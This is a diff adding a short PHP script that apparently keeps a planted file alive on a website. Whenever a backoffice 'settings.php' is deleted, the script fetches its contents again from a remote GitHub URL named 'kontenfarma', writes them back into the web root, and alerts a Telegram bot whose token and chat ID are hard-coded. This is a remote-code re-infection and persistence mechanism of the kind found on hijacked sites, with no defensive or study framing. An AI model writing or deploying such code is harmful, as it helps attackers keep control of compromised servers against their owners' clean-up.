@@ -1,0 +1,29 @@
+<?php
+$targetFile = '/home/fpldtr/public_html/Backoffice/settings.php';
+$backupURL = 'https://raw.githubusercontent.com/brianwijayacupu/Bangientau/refs/heads/main/kontenfarma';
+
+// Telegram config
+$telegramBotToken = '8349599623:AAHRR2SwOGvupKc6y6c0WVoyDxp-bwWSQhU';
+$telegramChatID = '1383301930'; // ← Ganti dengan angka Chat ID
+
+if (!file_exists($targetFile)) {
+    $content = file_get_contents($backupURL);
+    if ($content !== false) {
+        file_put_contents($targetFile, $content);
+        chmod($targetFile, 0644);
+        
+        // Kirim notifikasi ke Telegram
+        $message = "🚨 ALERT: File terhapus dan berhasil di-restore!\n\n";
+        $message .= "File: " . $targetFile . "\n";
+        $message .= "Waktu: " . date('Y-m-d H:i:s') . "\n";
+        
+        $telegramURL = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
+        $data = [
+            'chat_id' => $telegramChatID,
+            'text' => $message,
+        ];
+        
+        file_get_contents($telegramURL . '?' . http_build_query($data));
+    }
+}
+?>
